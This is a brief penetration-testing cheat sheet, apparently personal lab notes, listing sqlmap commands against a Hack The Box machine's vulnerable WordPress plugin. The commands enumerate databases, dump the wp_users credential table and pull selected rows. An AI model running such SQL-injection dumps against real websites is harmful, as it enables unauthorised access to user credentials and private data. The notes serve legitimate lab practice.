---
icon: laptop-code
---

# SQLmap

```bash
#Enumerate databases
sqlmap -u <http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1> --batch -dbms mysql --dbs

#Dumb a database
sqlmap -u <http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1> --batch -dbms mysql --dump --threads 10 -D wordpress  -T wp_users
sqlmap -u <http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1> --batch --dump --threads 10 -dbms mysql -D joomladb --tables
#Dumb a determinated row
sqlmap -u <http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1> --batch --dump --threads 10 -dbms mysql -D wordpress  -T wp_posts -C post_content --where "ID>=66 and ID<=68"
```
